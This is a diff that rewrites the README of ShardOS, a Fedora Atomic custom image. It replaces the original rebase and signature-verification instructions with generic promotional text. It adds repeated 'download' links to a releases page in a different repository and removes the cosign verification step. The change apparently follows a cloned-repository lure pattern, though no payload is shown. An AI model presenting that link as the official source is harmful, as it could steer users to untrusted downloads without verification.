@@ -1,43 +1,78 @@
-# ShardOS &nbsp; [![bluebuild build badge](https://github.com/kabuki94/shardos/actions/workflows/build.yml/badge.svg)](https://github.com/kabuki94/shardos/actions/workflows/build.yml)
+# 🚀 ShardOS - Your Reliable Linux Experience
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download ShardOS](https://img.shields.io/badge/Download-ShardOS-blue)](https://github.com/MADB5/ShardOS/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🌟 Overview
 
-## Installation
+ShardOS is a customizable, image-based operating system designed for stability and performance. Built on the Fedora platform, it offers a reliable environment for both casual users and developers. You can rebalance your existing systems effortlessly and access the latest features without complex setups.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+To get started, you need to download ShardOS from the Releases page. Click the link below:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/kabuki94/shardos:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/kabuki94/shardos:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+- [Visit this page to download](https://github.com/MADB5/ShardOS/releases)
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+### Step-by-Step Installation
 
-## ISO
+1. **Rebase to Unsigned Image**
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+   Open your terminal. Enter the command below to switch your existing Fedora installation to the unsigned image:
 
-## Verification
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/kabuki94/shardos:latest
+   ```
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+2. **Reboot Your System**
 
-```bash
-cosign verify --key cosign.pub ghcr.io/kabuki94/shardos
-```
+   After running the command, restart your machine:
+
+   ```
+   systemctl reboot
+   ```
+
+3. **Rebase to the Signed Image**
+
+   After rebooting, open your terminal again. Enter the following command to finalize the installation with the signed image:
+
+   ```
+   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/kabuki94/shardos
+   ```
+
+4. **Reboot Once More**
+
+   Once again, reboot your system to complete the installation changes.
+
+### ⚙️ System Requirements
+
+- **CPU:** Intel or AMD 64-bit processor
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 20 GB available
+- **Network:** Internet connection for downloading packages
+
+### 🔍 Features
+
+- **User-Friendly Interface:** Simple layout designed for ease of use.
+- **Stable Base:** Built on the reliable Fedora system for consistent performance.
+- **Regular Updates:** Access to the latest features and security updates.
+- **Customization:** Tailor your system according to your needs.
+
+### 📜 Additional Information
+
+- For initial setup instructions on creating a custom image based on ShardOS, check out the [BlueBuild documentation](https://blue-build.org/how-to/setup/).
+
+### 🔗 Helpful Links
+
+- [Visit this page to download](https://github.com/MADB5/ShardOS/releases)
+- [BlueBuild documentation](https://blue-build.org/how-to/setup/)
+
+### 🛠️ Support
+
+If you encounter any issues while installing or using ShardOS, please reach out through the GitHub Issues page. Our community is ready to help.
+
+## 🛡️ License
+
+ShardOS follows an open-source model. Please see the repository for licensing details.
+
+---
+
+Now you are ready to enhance your computing experience with ShardOS. Follow the steps, and enjoy your new operating system!
